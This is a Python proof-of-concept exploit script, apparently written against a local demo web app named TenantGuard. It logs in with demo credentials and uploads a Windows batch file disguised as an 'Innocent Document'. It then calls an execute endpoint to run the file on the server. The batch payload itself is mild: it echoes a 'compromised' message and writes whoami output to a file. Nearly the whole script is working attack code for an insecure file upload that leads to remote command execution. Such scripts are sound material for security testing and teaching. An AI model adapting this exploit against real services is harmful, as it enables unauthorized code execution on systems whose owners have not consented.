#!/usr/bin/env python3

import requests
import os
import tempfile

BASE_URL = "http://localhost:5000"

def create_malicious_file():
    # Create a simple batch file for Windows
    content = """@echo off
echo System compromised by Selemon Hailu
whoami > C:\\temp\\pwned.txt
"""
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as f:
        f.write(content)
        return f.name

def exploit_file_upload():
    print("[*] Testing insecure file upload...")
    
    # Login first
    login_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Create malicious file
    malicious_file = create_malicious_file()
    
    try:
        # Upload executable file
        with open(malicious_file, 'rb') as f:
            files = {'file': ('malware.bat', f, 'application/octet-stream')}
            data = {
                'title': 'Innocent Document',
                'description': 'Definitely not malware'
            }
            
            upload_response = requests.post(f"{BASE_URL}/api/documents/upload",
                                         headers=headers, files=files, data=data)
            
            if upload_response.status_code == 201:
                print("[+] Successfully uploaded executable file!")
                
                # Try to execute the file
                filename = upload_response.json()["document"]["filename"]
                exec_data = {"args": ""}
                
                exec_response = requests.post(f"{BASE_URL}/api/files/execute/{filename}",
                                           headers=headers, json=exec_data)
                
                if exec_response.status_code == 200:
                    print("[+] File execution successful!")
                    print(f"[+] Output: {exec_response.json().get('output', 'No output')}")
                    return True
    
    finally:
        # Cleanup
        if os.path.exists(malicious_file):
            os.unlink(malicious_file)
    
    print("[-] Exploit failed")
    return False

if __name__ == "__main__":
    exploit_file_upload()